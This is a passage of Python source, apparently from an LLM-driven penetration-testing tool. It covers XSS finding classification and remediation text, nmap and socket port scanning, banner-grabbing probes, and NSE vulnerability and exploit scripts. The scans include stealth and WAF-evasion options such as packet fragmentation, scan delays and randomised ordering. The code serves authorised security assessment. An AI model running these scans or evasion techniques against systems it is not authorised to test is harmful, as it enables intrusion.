    return any(detection_patterns) or any(script_contexts)

def _classify_xss_vulnerability(response: requests.Response, payload: str, method: str,
                                        session: requests.Session, url: str, 
                                        target_context: PayloadTargetContext) -> tuple:
    """Enhanced XSS classification with context awareness"""
    
    # Check for stored XSS by making a second request
    is_stored = False
    try:
        if method in ['GET', 'POST', 'POST-JSON']:
            second_response = session.get(url)
            if payload in second_response.text:
                is_stored = True
    except:
        pass
    
    # Context-aware severity assessment
    base_severity = 'High'
    
    # Critical contexts that escalate severity
    critical_contexts = [
        target_context.framework and target_context.framework.lower() in ['django', 'rails', 'laravel'],  # Popular frameworks
        target_context.cms and target_context.cms.lower() in ['wordpress', 'drupal'],  # CMSs with admin access
        target_context.authentication_type == 'cookie',  # Session-based auth vulnerable to hijacking
    ]
    
    if any(critical_contexts):
        base_severity = 'Critical'
    
    # Determine XSS type with context awareness
    if is_stored:
        return ('Stored XSS', 'Critical')
    elif method.startswith('HEADER'):
        severity = 'Critical' if target_context.has_waf else 'High'  # Header injection bypassing WAF is critical
        return ('Header-based XSS', severity)
    elif method == 'POST-JSON':
        return ('JSON-based XSS', base_severity)
    elif 'svg' in payload.lower() or 'iframe' in payload.lower():
        return ('HTML Injection XSS', base_severity)
    elif 'javascript:' in payload.lower():
        return ('URL-based XSS', base_severity)
    elif target_context.framework and '{{' in payload and '}}' in payload:
        return ('Template Injection XSS', 'Critical')  # Template injection is always critical
    else:
        return ('Reflected XSS', base_severity)

def _determine_xss_technique(payload: str, target_context: PayloadTargetContext) -> str:
    """Enhanced technique determination with context awareness"""
    payload_lower = payload.lower()
    
    # Framework-specific techniques
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework in ['angular', 'react', 'vue'] and 'constructor' in payload_lower:
            return f'{framework.title()} framework bypass'
        elif framework in ['django', 'flask'] and '{{' in payload:
            return 'Template engine injection'
    
    # Standard technique detection
    if 'svg' in payload_lower:
        return 'SVG-based XSS'
    elif 'iframe' in payload_lower:
        return 'iframe injection'
    elif 'javascript:' in payload_lower:
        return 'JavaScript protocol'
    elif any(event in payload_lower for event in ['onerror', 'onload', 'onfocus']):
        return 'Event handler injection'
    elif 'constructor' in payload_lower:
        return 'Framework bypass'
    elif target_context.has_waf and any(char in payload for char in ['%', '\\u', '\\x']):
        return 'WAF bypass technique'
    else:
        return 'Script injection'

def _get_xss_remediation(xss_type: str, method: str, target_context: PayloadTargetContext) -> str:
    """Enhanced remediation advice with context awareness"""
    base_remediation = "Implement input validation, output encoding, and Content Security Policy (CSP)"
    
    # Framework-specific remediation
    framework_remediation = ""
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework == 'react':
            framework_remediation = " Use React's built-in XSS protection and avoid dangerouslySetInnerHTML."
        elif framework == 'angular':
            framework_remediation = " Use Angular's sanitization service and avoid innerHTML assignments."
        elif framework == 'vue':
            framework_remediation = " Avoid v-html directive and use text interpolation instead."
        elif framework in ['django', 'flask']:
            framework_remediation = " Use template auto-escaping and avoid |safe filter."
    
    # Context-specific remediation
    if xss_type == 'Stored XSS':
        return f"{base_remediation}. CRITICAL: Sanitize data before storage and on output.{framework_remediation}"
    elif method.startswith('HEADER'):
        return f"{base_remediation}. Validate and sanitize all HTTP headers.{framework_remediation}"
    elif 'JSON' in xss_type:
        return f"{base_remediation}. Properly encode JSON responses and validate content-type.{framework_remediation}"
    elif 'Template' in xss_type:
        return f"CRITICAL: Disable user input in template expressions. {base_remediation}.{framework_remediation}"
    else:
        return f"{base_remediation}.{framework_remediation}"

def _get_xss_business_impact_per_vuln(xss_type: str, target_context: PayloadTargetContext) -> str:
    """Calculate business impact for individual vulnerability"""
    base_impact = "Client-side code execution and session hijacking"
    
    if 'Stored' in xss_type:
        return "CRITICAL - Persistent malicious code affecting all users"
    elif 'Template' in xss_type:
        return "CRITICAL - Server-side template injection leading to RCE"
    elif target_context.authentication_type == 'cookie':
        return f"HIGH - {base_impact} with session token theft"
    elif target_context.cms:
        return f"HIGH - {base_impact} with potential admin panel access"
    else:
        return f"MEDIUM - {base_impact}"

def _assess_xss_business_impact(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess overall business impact of XSS findings"""
    if not vulnerabilities:
        return "No XSS vulnerabilities detected"
    
    # Check for critical findings
    critical_findings = [v for v in vulnerabilities if isinstance(v, Vulnerability) and v.severity == 'Critical']
    stored_xss = [v for v in vulnerabilities if isinstance(v, Vulnerability) and 'Stored' in v.type]
    template_injection = [v for v in vulnerabilities if isinstance(v, Vulnerability) and 'Template' in v.type]
    
    if template_injection:
        return "CRITICAL - Template injection vulnerabilities allow server-side code execution"
    elif stored_xss:
        return "CRITICAL - Stored XSS affects all application users persistently"
    elif critical_findings:
        return "CRITICAL - Multiple critical XSS vulnerabilities detected"
    elif target_context.authentication_type:
        return "HIGH - XSS vulnerabilities can compromise user sessions and authentication"
    else:
        return "HIGH - XSS vulnerabilities allow client-side code execution"

def _assess_xss_compliance_risk(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess compliance risk from XSS vulnerabilities"""
    if not vulnerabilities:
        return "No compliance violations detected"
    
    risk_factors = []
    
    # Check for data protection violations
    if any(v.severity == 'Critical' for v in vulnerabilities if isinstance(v, Vulnerability)):
        risk_factors.append("GDPR/CCPA data protection violations")
    
    # Check for financial services
    if target_context.framework and 'payment' in target_context.framework.lower():
        risk_factors.append("PCI DSS compliance violations")
    
    # Check for authentication systems
    if target_context.authentication_type:
        risk_factors.append("Identity management security failures")
    
    # Check for healthcare/sensitive data
    if target_context.cms and 'health' in target_context.cms.lower():
        risk_factors.append("HIPAA compliance violations")
    
    if risk_factors:
        return "; ".join(risk_factors)
    else:
        return "General data privacy and security compliance at risk"

# ===== NETWORK RECONNAISSANCE FUNCTIONS =====

def nmap_scan(target: str, scan_type: str = "basic", ports: List[int] = None, 
              target_context: Union[PayloadTargetContext, Dict[str, Any]] = None,
              scan_mode: str = "comprehensive", custom_scripts: List[str] = None) -> ToolCallResult:
    """
    LLM-driven intelligent Nmap scanning with context-aware vulnerability detection
    
    Args:
        target: Target IP/hostname/CIDR  
        scan_type: basic, service, vuln, comprehensive, stealth, compliance, discovery
        ports: LLM-provided list of ports to scan (fallback to smart selection)
        target_context: PayloadTargetContext with environment details
        scan_mode: comprehensive, stealth, aggressive, compliance
        custom_scripts: LLM-provided NSE scripts to run
    """
    start_time = time.time()
    vulnerabilities = []
    
    try:
        # Convert target_context to PayloadTargetContext if it's a dict
        if isinstance(target_context, dict):
            target_context = PayloadTargetContext.from_dict(target_context)
        elif target_context is None:
            target_context = PayloadTargetContext()
        
        # Build intelligent nmap command based on context
        cmd = ['nmap']
        
        # Context-aware scan configuration
        scan_configs = _get_context_aware_scan_config(scan_type, scan_mode, target_context)
        cmd.extend(scan_configs['timing_options'])
        cmd.extend(scan_configs['scan_options'])
        
        # Smart port selection - use LLM ports or context-based selection
        port_list = _get_intelligent_port_list(ports, target_context, scan_type)
        if port_list:
            if len(port_list) <= 100:
                cmd.extend(['-p', ','.join(map(str, port_list))])
            else:
                cmd.extend(['-p', f"1-{max(port_list)}"])
        
        # Context-aware NSE script selection
        script_selection = _get_context_aware_scripts(custom_scripts, target_context, scan_type)
        if script_selection:
            cmd.extend(['--script', ','.join(script_selection)])

        # Framework and service-specific optimizations
        if target_context.web_server:
            cmd.extend(['--script', 'http-*'])
        if target_context.database:
            cmd.extend(['--script', f'{target_context.database.lower()}-*'])
        
        # WAF and security detection evasion
        if target_context.has_waf or scan_mode == "stealth":
            cmd.extend(['--randomize-hosts', '--data-length', '24'])
            cmd.extend(['-f', '--scan-delay', '2s'])
        
        # Output format for enhanced parsing
        cmd.extend(['-oX', '-'])
        
        # Target specification
        cmd.append(target)
        
        # Context-aware timeout
        timeout = _calculate_context_timeout(scan_type, scan_mode, len(port_list) if port_list else 1000)
            
        process = subprocess.run(
            cmd, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        
        output = process.stdout
        error_output = process.stderr
        
        # Enhanced context-aware parsing
        vulnerabilities = _parse_nmap_output_with_context(
            output, error_output, target, target_context, scan_type
        )
        
        execution_time = time.time() - start_time
        
        # Context-enhanced business impact assessment
        business_impact = _assess_context_business_impact(vulnerabilities, target_context)
        compliance_risk = _assess_context_compliance_risk(vulnerabilities, target_context)

        return ToolCallResult(
            success=True,
            tool_name="Intelligent Nmap Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target': target,
                'scan_type': scan_type,
                'scan_mode': scan_mode,
                'target_context': target_context.to_dict(),
                'command_summary': ' '.join(cmd[:10]) + '...',
                'ports_tested': len(port_list) if port_list else 'auto',
                'scripts_used': script_selection,
                'context_optimizations': {
                    'framework_specific': bool(target_context.framework),
                    'web_server_specific': bool(target_context.web_server),
                    'database_specific': bool(target_context.database),
                    'waf_evasion': target_context.has_waf,
                    'cms_specific': bool(target_context.cms)
                }
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk=compliance_risk
        )
        
    except subprocess.TimeoutExpired:
        return ToolCallResult(
            success=False,
            tool_name="Intelligent Nmap Scan",
            error=f"Nmap scan timed out after {timeout} seconds",
            execution_time=time.time() - start_time
        )
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Intelligent Nmap Scan",
            error=str(e),
            execution_time=time.time() - start_time
        )

def enterprise_port_scan(host: str, ports: List[int] = None, 
                        target_context: Union[PayloadTargetContext, Dict[str, Any]] = None,
                        scan_mode: str = "comprehensive", scan_method: str = "tcp_syn",
                        custom_service_probes: List[str] = None) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    open_ports = []
    service_info = {}
    
    try:
        import socket
        import threading
        import random
        import time as time_module
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        # Convert target_context to PayloadTargetContext if it's a dict
        if isinstance(target_context, dict):
            target_context = PayloadTargetContext.from_dict(target_context)
        elif target_context is None:
            target_context = PayloadTargetContext()
        
        # Intelligent port selection - use LLM ports or context-based selection
        port_list = _get_intelligent_port_list(ports, target_context, "port_scan")
        
        # Context-aware scan configuration
        scan_config = _get_context_aware_port_scan_config(scan_mode, target_context)
        scan_timeout = scan_config['timeout']
        thread_count = scan_config['threads']
        stealth_mode = scan_config['stealth']
        include_banner_grab = scan_config['banner_grab']
        
        # Stealth mode randomization
        if stealth_mode:
            random.shuffle(port_list)
            scan_timeout = random.uniform(scan_timeout * 0.8, scan_timeout * 1.2)
        
        # Thread-safe data structures
        lock = threading.Lock()
        scan_results = {}
        
        def scan_port(port):
            """Enhanced port scanning with context-aware service detection"""
            try:
                if stealth_mode:
                    time_module.sleep(random.uniform(0.1, 0.5))
                
                # Context-aware scan methods
                if scan_method == "tcp_syn" or scan_method == "tcp_connect":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(scan_timeout)
                    result = sock.connect_ex((host, port))
                    
                    if result == 0:
                        port_info = {'status': 'open', 'protocol': 'tcp'}
                        
                        # Context-aware banner grabbing
                        if include_banner_grab:
                            banner = _grab_intelligent_banner(sock, port, target_context, custom_service_probes)
                            if banner:
                                port_info['banner'] = banner
                                port_info['service'] = _identify_service_with_context(banner, port, target_context)
                        
                        with lock:
                            scan_results[port] = port_info
                            open_ports.append(port)
                    
                    sock.close()
                
                elif scan_method == "udp":
                    # Enhanced UDP scan with context awareness
                    udp_results = _perform_context_aware_udp_scan(host, port, target_context)
                    if udp_results:
                        with lock:
                            scan_results[port] = udp_results
                            open_ports.append(port)
                
            except Exception as e:
                logging.debug(f"Error scanning port {port}: {e}")
        
        # Execute context-aware threaded scanning
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = [executor.submit(scan_port, port) for port in port_list]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Thread execution error: {e}")
        
        # Context-aware vulnerability analysis
        for port, info in scan_results.items():
            vuln_analysis = _analyze_port_with_context(port, info, target_context, host)
            if vuln_analysis['is_vulnerable']:
                vuln = create_vulnerability(
                    vuln_type=vuln_analysis['vuln_type'],
                    severity=vuln_analysis['severity'],
                    evidence=vuln_analysis['evidence'],
                    port=str(port),
                    service=info.get('service', 'unknown'),
                    target=host,
                    tool='enterprise_port_scan',
                    technique=scan_method,
                    payload=info.get('banner', ''),
                    remediation=vuln_analysis['remediation'],
                    business_impact=vuln_analysis['business_impact'],
                    references=vuln_analysis.get('references', [])
                )
                vulnerabilities.append(vuln)
        
        # Enhanced security analysis based on context
        additional_vulns = _perform_context_port_analysis(host, scan_results, target_context)
        vulnerabilities.extend(additional_vulns)
        
        execution_time = time.time() - start_time
        
        # Context-enhanced business impact assessment
        business_impact = _assess_context_business_impact(vulnerabilities, target_context)
        compliance_risk = _assess_context_compliance_risk(vulnerabilities, target_context)
        
        return ToolCallResult(
            success=True,
            tool_name="Intelligent Port Scanner",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'host': host,
                'scan_mode': scan_mode,
                'scan_method': scan_method,
                'target_context': target_context.to_dict(),
                'ports_scanned': len(port_list),
                'open_ports': len(open_ports),
                'services_detected': len([info for info in scan_results.values() if info.get('service')]),
                'banners_captured': len([info for info in scan_results.values() if info.get('banner')]),
                'scan_results': scan_results,
                'context_optimizations': {
                    'framework_guided': bool(target_context.framework),
                    'service_guided': bool(target_context.web_server or target_context.database),
                    'cms_guided': bool(target_context.cms),
                    'stealth_mode': stealth_mode,
                    'custom_probes_used': bool(custom_service_probes)
                }
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk=compliance_risk
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="Intelligent Port Scanner",
            error=str(e),
            execution_time=time.time() - start_time
        )



def _parse_nmap_xml(xml_output: str, target: str) -> List[Vulnerability]:
    vulnerabilities = []
    
    try:
        import xml.etree.ElementTree as ET
        
        root = ET.fromstring(xml_output)
        
        for host in root.findall('host'):
            # Get host information
            host_ip = host.find('address').get('addr') if host.find('address') is not None else target
            
            # Parse ports
            ports = host.find('ports')
            if ports is not None:
                for port in ports.findall('port'):
                    port_id = port.get('portid')
                    protocol = port.get('protocol')
                    
                    state = port.find('state')
                    if state is not None and state.get('state') == 'open':
                        service = port.find('service')
                        service_name = service.get('name') if service is not None else 'unknown'
                        service_version = service.get('version') if service is not None else ''
                        
                        # Assess risk
                        risk_level = _assess_port_risk_advanced(int(port_id), service_name, service_version)
                        
                        if risk_level in ['High', 'Critical']:
                            vuln = create_vulnerability(
                                vuln_type='Open Port',
                                severity=risk_level,
                                evidence=f'Port {port_id}/{protocol} ({service_name}) is open' +
                                        (f' - Version: {service_version}' if service_version else ''),
                                port=port_id,
                                service=service_name,
                                target=host_ip,
                                tool='nmap',
                                remediation=_get_port_remediation(int(port_id), service_name)
                            )
                            vulnerabilities.append(vuln)
            
            # Parse script results
            hostscript = host.find('hostscript')
            if hostscript is not None:
                for script in hostscript.findall('script'):
                    vulnerabilities.extend(_parse_nse_script_result(script, host_ip))
            
            # Parse port scripts
            if ports is not None:
                for port in ports.findall('port'):
                    port_scripts = port.find('script')
                    if port_scripts is not None:
                        for script in port_scripts.findall('script'):
                            vulnerabilities.extend(_parse_nse_script_result(script, host_ip, port.get('portid')))
        
    except Exception as e:
        logging.error(f"Error parsing XML output: {e}")
    
    return vulnerabilities

def _parse_nse_script_result(script_element, host_ip: str, port: str = None) -> List[Vulnerability]:
    vulnerabilities = []
    
    try:
        script_id = script_element.get('id')
        script_output = script_element.get('output', '')
        
        # Map NSE scripts to vulnerability types
        script_mappings = {
            'ssl-cert': _parse_ssl_cert_script,
            'ssl-enum-ciphers': _parse_ssl_cipher_script,
            'http-security-headers': _parse_security_headers_script,
            'ssh-hostkey': _parse_ssh_hostkey_script,
            'vuln': _parse_vuln_script,
            'smb-vuln': _parse_smb_vuln_script,
            'ftp-anon': _parse_ftp_anon_script
        }
        
        for script_pattern, parser_func in script_mappings.items():
            if script_pattern in script_id:
                vulns = parser_func(script_output, host_ip, port)
                vulnerabilities.extend(vulns)
                break
        
    except Exception as e:
        logging.error(f"Error parsing NSE script result: {e}")
    
    return vulnerabilities

def _assess_port_risk(port: int) -> str:
    """Assess risk level of open ports"""
    high_risk_ports = {
        21: 'FTP - often misconfigured',
        22: 'SSH - brute force target',
        23: 'Telnet - unencrypted',
        25: 'SMTP - mail relay abuse',
        53: 'DNS - information disclosure',
        110: 'POP3 - credential exposure',
        143: 'IMAP - credential exposure',
        161: 'SNMP - information disclosure',
        445: 'SMB - lateral movement',
        1433: 'MSSQL - database access',
        3306: 'MySQL - database access',
        3389: 'RDP - brute force target',
        5432: 'PostgreSQL - database access',
        5900: 'VNC - remote access',
        6379: 'Redis - often unauthenticated'
    }
    
    critical_ports = [23, 161, 6379]  # Telnet, SNMP, Redis
    
    if port in critical_ports:
        return 'Critical'
    elif port in high_risk_ports:
        return 'High'
    elif port in [80, 443, 8080, 8443]:
        return 'Medium'
    else:
        return 'Low'

def _get_intelligent_port_list(llm_ports: List[int], target_context: PayloadTargetContext, scan_type: str) -> List[int]:    
    # Use LLM-provided ports if available
    if llm_ports:
        return llm_ports
    
    # Context-aware port selection as fallback
    context_ports = set()
    
    # Framework-specific ports
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework in ['django', 'flask', 'fastapi']:
            context_ports.update([8000, 8080, 5000, 8888])
        elif framework in ['rails', 'sinatra']:
            context_ports.update([3000, 4567])
        elif framework in ['express', 'nodejs']:
            context_ports.update([3000, 8080, 9000])
        elif framework in ['laravel', 'symfony']:
            context_ports.update([8000, 8080])
        elif framework in ['asp.net', 'iis']:
            context_ports.update([80, 443, 8080, 8443])
    
    # Web server specific ports
    if target_context.web_server:
        server = target_context.web_server.lower()
        if server == 'nginx':
            context_ports.update([80, 443, 8080, 8443])
        elif server == 'apache':
            context_ports.update([80, 443, 8080, 8443, 8000])
        elif server == 'iis':
            context_ports.update([80, 443, 8080, 8443])
        elif server == 'tomcat':
            context_ports.update([8080, 8443, 8009])
    
    # Database specific ports
    if target_context.database:
        db = target_context.database.lower()
        if db == 'mysql':
            context_ports.update([3306, 33060])
        elif db == 'postgresql':
            context_ports.update([5432])
        elif db == 'mssql':
            context_ports.update([1433, 1434])
        elif db == 'oracle':
            context_ports.update([1521, 1522])
        elif db == 'redis':
            context_ports.update([6379])
        elif db == 'mongodb':
            context_ports.update([27017, 27018])
    
    # CMS specific ports
    if target_context.cms:
        cms = target_context.cms.lower()
        if cms in ['wordpress', 'drupal', 'joomla']:
            context_ports.update([80, 443, 8080])
    
    # Common ports based on scan type
    common_ports = {
        'basic': [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995],
        'service': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 3306, 3389, 5432],
        'comprehensive': list(range(1, 1001)),  # Top 1000 ports
        'vuln': [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5432, 6379],
        'discovery': [22, 80, 443],
        'port_scan': [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 6379]
    }
    
    base_ports = common_ports.get(scan_type, common_ports['basic'])
    
    # Combine context ports with base ports
    final_ports = list(context_ports.union(set(base_ports)))
    
    return sorted(final_ports)

def _get_context_aware_scan_config(scan_type: str, scan_mode: str, target_context: PayloadTargetContext) -> Dict[str, List[str]]:
    """Generate context-aware nmap scan configuration"""
    
    config = {
        'timing_options': [],
        'scan_options': []
    }
    
    # Timing based on context and mode
    if target_context.has_waf or scan_mode == "stealth":
        config['timing_options'] = ['-T1', '-f', '--scan-delay', '2s']
    elif scan_mode == "aggressive":
        config['timing_options'] = ['-T4', '--min-rate', '1000']
    else:
        config['timing_options'] = ['-T3']
    
    # Scan options based on type
    if scan_type == "basic":
        config['scan_options'] = ['-sS']
    elif scan_type == "service":
        config['scan_options'] = ['-sV', '-sC', '--version-intensity', '7']
    elif scan_type == "vuln":
        config['scan_options'] = ['--script', 'vuln,exploit']
    elif scan_type == "discovery":
        config['scan_options'] = ['-sn']
    elif scan_type == "compliance":
        config['scan_options'] = ['-sV', '-sC', '--script', 'ssl-cert,ssl-enum-ciphers']
    else:  # comprehensive
        config['scan_options'] = ['-sS', '-sV', '-sC', '--script', 'default,vuln']
    
    return config

def _get_context_aware_scripts(llm_scripts: List[str], target_context: PayloadTargetContext, scan_type: str) -> List[str]:
    """Generate context-aware NSE script selection"""
    
    # Use LLM-provided scripts if available
    if llm_scripts:
        return llm_scripts
    
    scripts = set()
    
    # Framework-specific scripts
    if target_context.framework:
        framework = target_context.framework.lower()
        if 'django' in framework or 'rails' in framework:
            scripts.update(['http-csrf', 'http-method-tamper'])
        if 'wordpress' in str(target_context.cms).lower():
            scripts.update(['http-wordpress-*'])
    
    # Web server specific scripts
    if target_context.web_server:
        server = target_context.web_server.lower()
        if server in ['apache', 'nginx']:
            scripts.update(['http-methods', 'http-security-headers'])
        if server == 'iis':
            scripts.update(['http-iis-*'])
    
    # Database specific scripts
    if target_context.database:
        db = target_context.database.lower()
        if db == 'mysql':
            scripts.update(['mysql-*'])
        elif db == 'postgresql':
            scripts.update(['pgsql-*'])
        elif db == 'mssql':
            scripts.update(['ms-sql-*'])
    
    # Default scripts based on scan type
    if scan_type == "vuln":
        scripts.update(['vuln', 'exploit'])
    elif scan_type == "service":
        scripts.update(['version'])
    
    return list(scripts)

def _calculate_context_timeout(scan_type: str, scan_mode: str, port_count: int) -> int:
    
    base_timeout = {
        'basic': 300,
        'service': 600,
        'vuln': 900,
        'comprehensive': 1200,
        'discovery': 180
    }.get(scan_type, 300)
    
    # Adjust for scan mode
    if scan_mode == "stealth":
        base_timeout *= 2
    elif scan_mode == "aggressive":
        base_timeout *= 0.7
    
    # Adjust for port count
    if port_count > 1000:
        base_timeout *= 1.5
    elif port_count < 100:
        base_timeout *= 0.8
    
    return int(base_timeout)

def _parse_nmap_output_with_context(output: str, error_output: str, target: str, 
                                   target_context: PayloadTargetContext, scan_type: str) -> List[Vulnerability]:    
    vulnerabilities = []
    
    try:
        # Use existing XML parser as base
        vulnerabilities.extend(_parse_nmap_xml(output, target))
        
        # Context-aware enhancement of vulnerabilities
        for vuln in vulnerabilities:
            if isinstance(vuln, Vulnerability):
                # Enhance based on context
                if target_context.framework and vuln.service:
                    vuln.business_impact = f"Service exposure in {target_context.framework} environment"
                
                if target_context.has_waf and vuln.severity in ['High', 'Critical']:
                    vuln.evidence += " [WAF bypass may be required]"
                
                # Add context-specific remediation
                if target_context.cms:
                    if not vuln.remediation:
                        vuln.remediation = ""
                    vuln.remediation += f"\n\nCMS-specific guidance for {target_context.cms}:"
                    vuln.remediation += "\n- Update CMS and plugins"
                    vuln.remediation += "\n- Review user permissions"
    
    except Exception as e:
        logging.error(f"Error in context-aware parsing: {e}")
    
    return vulnerabilities

def _get_context_aware_port_scan_config(scan_mode: str, target_context: PayloadTargetContext) -> Dict[str, Any]:
    config = {
        'timeout': 5,
        'threads': 100,
        'stealth': False,
        'banner_grab': True
    }
    
    # Adjust based on scan mode
    if scan_mode == "stealth":
        config.update({
            'timeout': 10,
            'threads': 20,
            'stealth': True,
            'banner_grab': True
        })
    elif scan_mode == "aggressive":
        config.update({
            'timeout': 3,
            'threads': 200,
            'stealth': False,
            'banner_grab': True
        })
    elif scan_mode == "discovery":
        config.update({
            'timeout': 2,
            'threads': 150,
            'stealth': False,
            'banner_grab': False
        })
    
    # Context adjustments
    if target_context.has_waf:
        config['stealth'] = True
        config['threads'] = min(config['threads'], 50)
    
    return config

def _grab_intelligent_banner(sock, port: int, target_context: PayloadTargetContext, 
                            custom_probes: List[str] = None) -> str:
    try:
        # Use custom probes if provided by LLM
        if custom_probes:
            for probe in custom_probes:
                try:
                    sock.send(probe.encode())
                    banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    if banner.strip():
                        return banner.strip()
                except:
                    continue
        
        # Context-aware default probes
        probes = _get_context_aware_probes(port, target_context)
        
        for probe in probes:
            try:
                sock.send(probe.encode())
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                if banner.strip():
                    return banner.strip()
            except:
                continue
                
        return ""
    except Exception as e:
        logging.debug(f"Banner grab error on port {port}: {e}")
        return ""

def _get_context_aware_probes(port: int, target_context: PayloadTargetContext) -> List[str]:
    
    probes = []
    
    # Port-specific probes
    if port == 80 or port == 8080:
        probes.extend(["GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"])
    elif port == 443 or port == 8443:
        probes.extend(["GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"])
    elif port == 21:
        probes.extend(["\r\n"])
    elif port == 22:
        probes.extend(["\r\n"])
    elif port == 25:
        probes.extend(["HELP\r\n"])
    
    # Database probes based on context
    if target_context.database:
        db = target_context.database.lower()
        if db == 'mysql' and port == 3306:
            probes.extend(["\x00\x00\x00\x01"])
        elif db == 'postgresql' and port == 5432:
            probes.extend(["\x00\x00\x00\x08\x04\xd2\x16\x2f"])
    
    # Framework-specific probes
    if target_context.framework:
        framework = target_context.framework.lower()
        if 'django' in framework:
            probes.extend(["GET /admin/ HTTP/1.1\r\nHost: localhost\r\n\r\n"])
        elif 'rails' in framework:
            probes.extend(["GET /rails/info HTTP/1.1\r\nHost: localhost\r\n\r\n"])
    
    # Default probe
    probes.append("\r\n")
    
    return probes

def _identify_service_with_context(banner: str, port: int, target_context: PayloadTargetContext) -> str:
    """Context-aware service identification"""
    
    banner_lower = banner.lower()
    
    # Context-enhanced identification
    if target_context.web_server:
        server = target_context.web_server.lower()
        if server in banner_lower:
            return f"{server}_web_server"
    
    if target_context.database:
        db = target_context.database.lower()
        if db in banner_lower:
            return f"{db}_database"
    
    if target_context.framework:
        framework = target_context.framework.lower()
        if framework in banner_lower:
            return f"{framework}_framework"
    
    # Standard identification
    return _identify_service_from_banner(banner, port)

def _perform_context_aware_udp_scan(host: str, port: int, target_context: PayloadTargetContext) -> Dict:
    """Context-aware UDP scanning"""
    
    try:
        import socket
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        
        # Context-aware UDP probes
        if port == 53 and target_context.framework:  # DNS
            probe = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
        elif port == 161:  # SNMP
            probe = b'\x30\x26\x02\x01\x00\x04\x06public\xa0\x19\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'
        else:
            probe = b''
        
        sock.sendto(probe, (host, port))
        response = sock.recv(1024)
        sock.close()
        
        return {
            'status': 'open',
            'protocol': 'udp',
            'banner': response.decode('utf-8', errors='ignore')[:100]
        }
    except:
        return None

def _analyze_port_with_context(port: int, info: Dict, target_context: PayloadTargetContext, host: str) -> Dict:
    """Context-aware port vulnerability analysis"""
    
    analysis = {
        'is_vulnerable': False,
        'vuln_type': 'Open Port',
        'severity': 'Info',
        'evidence': '',
        'remediation': '',
        'business_impact': '',
        'references': []
    }
    
    # Enhanced risk assessment based on context
    base_risk = _assess_port_risk_advanced(port, info.get('service', ''), info.get('banner', ''))
    
    # Context enhancement
    if target_context.framework and port in [8000, 8080, 3000]:
        if base_risk in ['Low', 'Medium']:
            base_risk = 'Medium'
        analysis['business_impact'] = f"Development server exposure in {target_context.framework} environment"
    
    if target_context.database and port in [3306, 5432, 1433]:
        if base_risk != 'Critical':
            base_risk = 'High'
        analysis['business_impact'] = f"Database service exposure: {target_context.database}"
    
    if target_context.has_waf and base_risk in ['High', 'Critical']:
        analysis['evidence'] += " [Protected by WAF - may require evasion techniques]"
    
    if base_risk in ['Medium', 'High', 'Critical']:
        analysis.update({
            'is_vulnerable': True,
            'severity': base_risk,
            'evidence': f"Port {port} ({info.get('service', 'unknown')}) is accessible",
            'remediation': _get_context_aware_remediation(port, info.get('service', ''), target_context)
        })
    
    return analysis

def _get_context_aware_remediation(port: int, service: str, target_context: PayloadTargetContext) -> str:
    """Generate context-aware remediation advice"""
    
    base_remediation = _get_port_remediation(port, service)
    
    context_advice = []
    
    if target_context.framework:
        framework = target_context.framework.lower()
        if 'django' in framework:
            context_advice.append("Configure Django ALLOWED_HOSTS properly")
            context_advice.append("Use Django security middleware")
        elif 'rails' in framework:
            context_advice.append("Configure Rails force_ssl in production")
            context_advice.append("Use Rails security headers")
    
    if target_context.web_server:
        server = target_context.web_server.lower()
        if server == 'nginx':
            context_advice.append("Configure nginx security headers")
        elif server == 'apache':
            context_advice.append("Enable Apache security modules")
    
    if target_context.has_waf:
        context_advice.append("Review WAF configuration for this service")
    
    if context_advice:
        return base_remediation + "\n\nContext-specific recommendations:\n" + "\n".join(f"- {advice}" for advice in context_advice)
    
    return base_remediation

def _perform_context_port_analysis(host: str, scan_results: Dict, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Perform additional context-aware port analysis"""
    
    vulnerabilities = []
    
    # Analyze port combinations
    open_ports = list(scan_results.keys())
    
    # Web application stack detection
    if 80 in open_ports or 443 in open_ports:
        if 3306 in open_ports:  # MySQL
            vuln = create_vulnerability(
                vuln_type='LAMP/LEMP Stack Detection',
                severity='Medium',
                evidence=f'Web server and MySQL detected on {host}',
                target=host,
                business_impact='Full web application stack exposed',
                remediation='Secure database access and implement proper network segmentation'
            )
            vulnerabilities.append(vuln)
    
    # Development environment detection
    dev_ports = [8000, 8080, 3000, 4000, 5000]
    detected_dev_ports = [p for p in dev_ports if p in open_ports]
    if detected_dev_ports and target_context.framework:
